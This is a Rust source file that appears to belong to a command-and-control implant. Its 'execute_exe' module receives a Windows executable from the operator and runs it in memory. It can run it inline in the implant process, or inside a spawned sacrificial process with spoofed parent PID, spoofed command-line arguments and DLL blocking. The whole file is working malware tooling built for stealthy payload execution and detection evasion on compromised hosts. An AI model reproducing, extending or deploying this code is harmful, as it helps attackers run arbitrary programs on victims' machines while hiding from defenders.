use std::{convert::TryFrom, ptr::null};
use async_trait::async_trait;
use malefic_helper::{common::format_osstring, win::kit::pe::{inlinepe::inline_pe, runpe::run_pe, unload_pe}};

use crate::{check_request, to_error, Module, Result, TaskResult};
use malefic_trait::module_impl;
use malefic_helper::{
    common::format_cmdline,
    protobuf::implantpb::{Arch, AssemblyResponse, spite::Body},
};

pub struct ExecuteExe {}

#[async_trait]
#[module_impl("execute_exe")]
impl Module for ExecuteExe {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let arch = Arch::try_from(request.arch).unwrap_or(Arch::X8664);
        let is_x86 = matches!(arch, Arch::I686);
        let entrypoint = request.entry_point;

        let mut result: Vec<u8> = Vec::new();

        if let Some(sacrifice) = request.sacrifice {
            let cmdline = format_cmdline(request.process_name, request.args);
            let argue = sacrifice.argue;
            let (start_commandline, hijack_commandline) = if argue.is_empty() {
                (cmdline, String::new())
            } else {
                (argue, cmdline)
            };
            unsafe {
                result = run_pe(
                    start_commandline.as_bytes(),
                    hijack_commandline.as_bytes(),
                    &request.bin,
                    entrypoint.as_bytes(),
                    is_x86,
                    sacrifice.ppid,
                    sacrifice.block_dll,
                    request.output);
            }
        } else {
            let par = if request.args.is_empty() {
                String::new()
            } else {
                format_cmdline(request.process_name, request.args)
            };
            unsafe {
                result = inline_pe(
                    request.bin.as_ptr() as _,
                    request.bin.len(),
                    null(),
                    null(),
                    par.as_ptr() as _,
                    par.len(),
                    entrypoint.as_ptr() as _,
                    entrypoint.len(),
                    false,
                    request.output,
                    // 1000
                    request.timeout,
                );
            }
        }

        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(AssemblyResponse{
            status: 0,
            data: result,
            err: "".to_string(),
        })))
    }
}